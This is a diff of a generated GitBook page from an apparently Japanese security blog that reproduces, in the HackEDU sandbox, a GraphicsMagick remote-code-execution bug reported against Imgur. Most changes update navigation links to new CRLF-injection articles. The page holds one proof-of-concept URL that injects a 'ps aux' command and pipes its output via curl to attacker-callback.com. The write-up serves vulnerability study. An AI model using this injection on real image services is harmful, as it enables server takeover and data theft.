@@ -61,7 +61,7 @@
     <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">
 
     
-    <link rel="next" href="../2018/analyzing_samy_xss_worm.html" />
+    <link rel="next" href="../2018/impact_of_cookie_bomb.html" />
     
     
     <link rel="prev" href="../" />
@@ -133,12 +133,38 @@
         
         
     
-        <li class="chapter " data-level="3.1" data-path="../2018/analyzing_samy_xss_worm.html">
+        <li class="chapter " data-level="3.1" data-path="../2018/impact_of_cookie_bomb.html">
+            
+                <a href="../2018/impact_of_cookie_bomb.html">
+            
+                    
+                    CRLFインジェクションによるCookie Bombの脅威
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.2" data-path="../2018/analyzing_samy_xss_worm.html">
             
                 <a href="../2018/analyzing_samy_xss_worm.html">
             
                     
                     XSSワーム「Samy」の動作を解析する
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.3" data-path="../2018/crlfi_via_path_of_request-uri.html">
+            
+                <a href="../2018/crlfi_via_path_of_request-uri.html">
+            
+                    
+                    Request-URIのパスからのCRLFインジェクション
             
                 </a>
             
@@ -197,7 +223,7 @@ HackEDU&#x306E;&#x7121;&#x6599;&#x30A2;&#x30AB;&#x30A6;&#x30F3;&#x30C8;&#x3092;&
 <p><img src="https://user-images.githubusercontent.com/5434303/53991406-de665580-416d-11e9-9901-3921ed52caa3.png" alt="rotate"></p>
 <p>&#x3055;&#x3089;&#x306A;&#x308B;&#x8ABF;&#x67FB;&#x306E;&#x7D50;&#x679C;&#x3001;Imgur&#x3067;&#x306F;GraphicsMagick&#x304C;&#x5229;&#x7528;&#x3055;&#x308C;&#x3066;&#x3044;&#x308B;&#x3068;neex&#x6C0F;&#x306F;&#x78BA;&#x4FE1;&#x3057;&#x3001;<code>-write</code> &#x30AA;&#x30D7;&#x30B7;&#x30E7;&#x30F3;&#x3067;&#x4EFB;&#x610F;&#x306E;&#x30B3;&#x30DE;&#x30F3;&#x30C9;&#x3092;&#x5B9F;&#x884C;&#x3067;&#x304D;&#x308B;&#x4ED5;&#x69D8;&#x3092;&#x7528;&#x3044;&#x3066;RCE&#x3092;&#x5B9F;&#x8A3C;&#x3057;&#x305F;<sup id="f1"><a href="#fn1">1</a></sup>&#x3002;PoC&#x3067;&#x306F; <code>y</code> &#x30D1;&#x30E9;&#x30E1;&#x30FC;&#x30BF;&#x304B;&#x3089;&#x633F;&#x5165;&#x3057;&#x305F; <code>ps</code> &#x30B3;&#x30DE;&#x30F3;&#x30C9;&#x306E;&#x5B9F;&#x884C;&#x7D50;&#x679C;&#x3092; <code>curl</code> &#x30B3;&#x30DE;&#x30F3;&#x30C9;&#x3067;&#x5916;&#x90E8;&#x306E;&#x30B5;&#x30FC;&#x30D0;&#x30FC;&#x3078;&#x9001;&#x4FE1;&#x3057;&#x3066;&#x3044;&#x308B;&#x3002;</p>
 <p>&#x30B5;&#x30F3;&#x30C9;&#x30DC;&#x30C3;&#x30AF;&#x30B9;&#x74B0;&#x5883;&#x3067;&#x306F; <code>http://attacker-callback.com:9000</code> &#x3078;&#x306E;&#x30B3;&#x30FC;&#x30EB;&#x30D0;&#x30C3;&#x30AF;&#x3092;&#x4EEE;&#x60F3;&#x30D6;&#x30E9;&#x30A6;&#x30B6;&#x306E;2&#x3064;&#x76EE;&#x306E;&#x30BF;&#x30D6;&#x3067;&#x78BA;&#x8A8D;&#x3067;&#x304D;&#x308B;&#x3002;2&#x3064;&#x76EE;&#x306E;&#x30BF;&#x30D6;&#x3092;&#x4E8B;&#x524D;&#x306B;&#x958B;&#x3044;&#x3066;&#x30EA;&#x30C3;&#x30B9;&#x30F3;&#x72B6;&#x614B;&#x306B;&#x3057;&#x3066;&#x304B;&#x3089;&#x3001;1&#x3064;&#x76EE;&#x306E;&#x30BF;&#x30D6;&#x3067;&#x4EE5;&#x4E0B;&#x306E;URL&#x306B;&#x30A2;&#x30AF;&#x30BB;&#x30B9;&#x3059;&#x308B;&#x3068; <code>ps</code> &#x30B3;&#x30DE;&#x30F3;&#x30C9;&#x306E;&#x5B9F;&#x884C;&#x7D50;&#x679C;&#x3092;&#x53D7;&#x3051;&#x53D6;&#x308C;&#x308B;&#x3002;&#x5B9F;&#x969B;&#x306E;&#x74B0;&#x5883;&#x3067;&#x306F;&#x30B9;&#x30DA;&#x30FC;&#x30B9;&#xFF08;%20&#xFF09;&#x3092;&#x633F;&#x5165;&#x3067;&#x304D;&#x306A;&#x304B;&#x3063;&#x305F;&#x305F;&#x3081;&#x304B;&#x3001;neex&#x6C0F;&#x306F; <code>${IFS}</code> &#x3092;&#x4EE3;&#x7528;&#x3057;&#x3066;&#x6587;&#x5B57;&#x3092;&#x533A;&#x5207;&#x3063;&#x3066;&#x3044;&#x308B;<sup id="f2"><a href="#fn2">2</a></sup>&#x3002;</p>
-<p>http:&lt;/i&gt;//imger.com/edit/process?imageid=cd4caa87977d1469cfeedf5cce8e2992.jpg&amp;a=crop&amp;x=95&amp;y=41%20-write%20|ps${IFS}aux|curl${IFS}http:&lt;/i&gt;//attacker-callback.com:9000${IFS}-d${IFS}@-&amp;w=768&amp;h=328&amp;random=asdf</p>
+<p>http:<span>//imger.com/edit/process?imageid=cd4caa87977d1469cfeedf5cce8e2992.jpg&amp;a=crop&amp;x=95&amp;y=41%20-write%20|ps${IFS}aux|curl${IFS}http:<span>//attacker-callback.com:9000${IFS}-d${IFS}@-&amp;w=768&amp;h=328&amp;random=asdf</span></span></p>
 <p><img src="https://user-images.githubusercontent.com/5434303/53991423-ec1bdb00-416d-11e9-8345-4de5bbc8f3b2.png" alt="callback"></p>
 <h2 id="hackedu&#x3067;&#x306E;http&#x30EA;&#x30AF;&#x30A8;&#x30B9;&#x30C8;&#x306E;&#x518D;&#x9001;">HackEDU&#x3067;&#x306E;HTTP&#x30EA;&#x30AF;&#x30A8;&#x30B9;&#x30C8;&#x306E;&#x518D;&#x9001;</h2>
 <p>&#x4ECA;&#x56DE;&#x53D6;&#x308A;&#x4E0A;&#x3052;&#x305F;&#x8106;&#x5F31;&#x6027;&#x306F;GET&#x30D1;&#x30E9;&#x30E1;&#x30FC;&#x30BF;&#x3067;&#x3082;&#x518D;&#x73FE;&#x3067;&#x304D;&#x305F;&#x305F;&#x3081;&#x3001;&#x4EEE;&#x60F3;&#x30D6;&#x30E9;&#x30A6;&#x30B6;&#x306E;&#x30A2;&#x30C9;&#x30EC;&#x30B9;&#x30D0;&#x30FC;&#x304B;&#x3089;&#x30D1;&#x30E9;&#x30E1;&#x30FC;&#x30BF;&#x64CD;&#x4F5C;&#x304C;&#x53EF;&#x80FD;&#x3067;&#x3042;&#x3063;&#x305F;&#x3002;&#x3057;&#x304B;&#x3057;POST&#x30D1;&#x30E9;&#x30E1;&#x30FC;&#x30BF;&#x3067;&#x306E;&#x8106;&#x5F31;&#x6027;&#x3092;&#x691C;&#x8A3C;&#x3059;&#x308B;&#x5834;&#x5408;&#x3001;HTTP&#x30EA;&#x30AF;&#x30A8;&#x30B9;&#x30C8;&#x3092;&#x4F55;&#x5EA6;&#x3082;&#x30A4;&#x30F3;&#x30BF;&#x30FC;&#x30BB;&#x30D7;&#x30C8;&#x3057;&#x3066;&#x66F8;&#x304D;&#x63DB;&#x3048;&#x308B;&#x3053;&#x3068;&#x306B;&#x306A;&#x308B;&#x3002;&#x30B5;&#x30F3;&#x30C9;&#x30DC;&#x30C3;&#x30AF;&#x30B9;&#x74B0;&#x5883;&#x306E;&#x4EEE;&#x60F3;&#x30D7;&#x30ED;&#x30AD;&#x30B7;&#x306B;&#x306F;HTTP&#x30EA;&#x30AF;&#x30A8;&#x30B9;&#x30C8;&#x306E;&#x518D;&#x9001;&#x6A5F;&#x80FD;&#x304C;&#x642D;&#x8F09;&#x3055;&#x308C;&#x3066;&#x3044;&#x306A;&#x3044;&#x305F;&#x3081;&#x3001;&#x611B;&#x7528;&#x306E;&#x30ED;&#x30FC;&#x30AB;&#x30EB;&#x30D7;&#x30ED;&#x30AD;&#x30B7;&#x3067;&#x306E;&#x518D;&#x9001;&#x3092;&#x8A66;&#x307F;&#x308B;&#x3002;</p>
@@ -240,7 +266,7 @@ HackEDU&#x306E;&#x7121;&#x6599;&#x30A2;&#x30AB;&#x30A6;&#x30F3;&#x30C8;&#x3092;&
                 </a>
                 
                 
-                <a href="../2018/analyzing_samy_xss_worm.html" class="navigation navigation-next " aria-label="Next page: XSSワーム「Samy」の動作を解析する">
+                <a href="../2018/impact_of_cookie_bomb.html" class="navigation navigation-next " aria-label="Next page: CRLFインジェクションによるCookie Bombの脅威">
                     <i class="fa fa-angle-right"></i>
                 </a>
                 
@@ -251,7 +277,7 @@ HackEDU&#x306E;&#x7121;&#x6599;&#x30A2;&#x30AB;&#x30A6;&#x30F3;&#x30C8;&#x3092;&
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"HackerOneに報告された脆弱性をHackEDUで再現する","level":"2.1","depth":1,"next":{"title":"XSSワーム「Samy」の動作を解析する","level":"3.1","depth":1,"path":"2018/analyzing_samy_xss_worm.md","ref":"2018/analyzing_samy_xss_worm.md","articles":[]},"previous":{"title":"Akaki I/O","level":"1.1","depth":1,"path":"README.md","ref":"README.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["-sharing"],"pluginsConfig":{"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"book.css"}},"file":{"path":"2019/hackedu.md","mtime":"2019-03-21T06:47:36.784Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2019-03-21T12:46:00.873Z"},"basePath":"..","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"title":"HackerOneに報告された脆弱性をHackEDUで再現する","level":"2.1","depth":1,"next":{"title":"CRLFインジェクションによるCookie Bombの脅威","level":"3.1","depth":1,"path":"2018/impact_of_cookie_bomb.md","ref":"2018/impact_of_cookie_bomb.md","articles":[]},"previous":{"title":"Akaki I/O","level":"1.1","depth":1,"path":"README.md","ref":"README.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["-sharing"],"pluginsConfig":{"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"book.css"}},"file":{"path":"2019/hackedu.md","mtime":"2019-03-21T13:03:21.061Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2019-03-21T14:30:42.313Z"},"basePath":"..","book":{"language":""}});
         });
     </script>
 </div>
